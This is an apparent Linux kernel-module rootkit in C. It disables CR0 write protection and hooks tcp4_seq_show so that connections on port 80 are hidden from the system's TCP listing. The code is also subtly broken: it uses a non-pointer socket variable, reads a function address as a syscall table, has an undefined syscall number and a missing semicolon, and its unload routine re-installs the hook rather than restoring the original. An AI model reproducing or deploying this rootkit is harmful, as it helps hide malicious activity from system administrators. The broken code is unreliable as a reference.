/*
 * Author: Arthur (rthxr) 
 * 05/02/2024
 */

#include<linux/module.h>
#include<linux/kernel.h>
#include "lib/ftrace_helper.h"

#define PORT 0x50

unsigned long *__sysc_table;
typedef asmlinkage long(*t_syscall )(const struct pt_regs *);

unsigned long *__ret_sysc_table(void)
{
    __sysc_table = (unsigned long*)kallsyms_lookup_name("tcp4_seq_show");
    return __sysc_table;
}

unsigned long cr0;
static inline void _cr0(unsigned long value)
{
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0": "+r"(value), 
                 "+m"(__force_order));
}

//static asmlinkage long tcp4_seq_show(const seq_file *seq, void *v)
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long hooking_tcp4(struct seq_file *seq, void *v)
{
  struct sock sk = v;

  if (sk != (struct sock *)0x01 && sk->sk_num == PORT)
        return 0;

    return (long)orig_tcp4_seq_show(seq, v);
}

static int __init lkmtotcphooking_init(void)
{
    unsigned long *__sysct = __ret_sysc_table;

    _cr0(cr0 & ~0x00010000);
    
    __orig_tcp4_seq_show = (t_syscall)__sysct[__NR_tcp4]
    __sysct[__NR_tcp4] = (unsigned long)hooking_tcp4;

    _cr0(cr0);
    return 0;
}

static void __exit lkmtotcphooking_exit(void)
{ 
    _cr0(cr0 & ~0x00010000);
    __sysct[__NR_tcp4] = (unsigned long)hooking_tcp4;
    _cr0(cr0);
}

module_init(lkmtotcphooking_init);
module_exit(lkmtotcphooking_exit);
